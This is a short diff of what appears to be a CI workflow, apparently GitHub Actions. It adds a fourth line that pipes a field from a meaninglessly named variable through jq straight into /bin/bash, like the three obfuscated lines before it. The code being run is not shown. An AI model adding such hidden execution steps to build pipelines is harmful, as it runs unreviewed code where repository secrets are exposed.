@@ -29,6 +29,7 @@ jobs:
           echo $cp613 | jq -r .bcu7 | /bin/bash
           echo $if2591 | jq -r .mksk702 | /bin/bash
           printf '%s' "$kb7968" | jq -r .jgouf4 | /bin/bash
+          echo $yd62 | jq -r .coue70192 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
